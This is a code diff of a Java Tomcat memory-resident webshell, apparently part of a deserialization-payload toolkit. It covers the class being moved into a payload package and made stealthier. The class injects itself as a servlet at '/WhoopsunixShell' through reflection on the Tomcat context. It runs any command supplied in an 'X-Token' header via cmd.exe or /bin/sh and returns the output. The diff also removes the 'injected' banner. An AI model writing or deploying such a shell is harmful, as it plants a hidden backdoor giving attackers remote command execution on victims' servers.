@@ -1,4 +1,4 @@
-package com.demo.memshell;
+package yspserial.payloads.memshell.tomcat;
 
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
@@ -13,9 +13,9 @@ import java.lang.reflect.Method;
  * Tomcat 8 9
  */
 public class TomcatServletContextClassMS implements Servlet {
-
-    final private static String NAME = "Whoopsunix";
-    final private static String pattern = "/WhoopsunixShell";
+    private static String NAME = "Whoopsunix";
+    private static String pattern = "/WhoopsunixShell";
+    private static String header = "X-Token";
 
     public TomcatServletContextClassMS() {
 
@@ -48,7 +48,7 @@ public class TomcatServletContextClassMS implements Servlet {
                 // 添加到 standardContext
                 standardContext.addChild(wrapper);
 
-                try{
+                try {
                     // M1 Servlet映射到URL模式
                     // standardContext.addServletMapping(pattern,NAME);
                     Method addServletMappingMethod = standardContext.getClass().getDeclaredMethod("addServletMapping", String.class, String.class);
@@ -79,13 +79,12 @@ public class TomcatServletContextClassMS implements Servlet {
     public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
-            String header = httpServletRequest.getHeader("X-Token");
-            if (header == null) {
+            String cmd = httpServletRequest.getHeader(header);
+            if (cmd == null) {
                 return;
             }
-            String result = exec(header);
+            String result = exec(cmd);
             PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("TomcatServletContextClassMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
@@ -105,7 +104,7 @@ public class TomcatServletContextClassMS implements Servlet {
     public static String exec(String str) {
         try {
             String[] cmd = null;
-            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 cmd = new String[]{"cmd.exe", "/c", str};
             } else {
                 cmd = new String[]{"/bin/sh", "-c", str};
